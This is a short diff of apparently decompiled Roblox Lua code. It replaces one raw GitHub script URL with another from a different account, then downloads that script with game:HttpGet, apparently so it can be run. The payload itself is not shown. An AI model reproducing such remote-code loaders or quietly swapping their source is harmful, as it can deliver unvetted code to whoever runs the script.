@@ -652,7 +652,7 @@ else
             Icon = "rbxassetid://6034509993"
         })
     };
-    local v131 = "https://raw.githubusercontent.com/ChloeRewite/test/refs/heads/main/2.lua";
+    local v131 = "https://raw.githubusercontent.com/sctefhanie/raplii/refs/heads/main/r.lua";
     local l_status_4, l_result_4 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
         -- upvalues: v131 (ref)
         local v132 = game:HttpGet(v131);
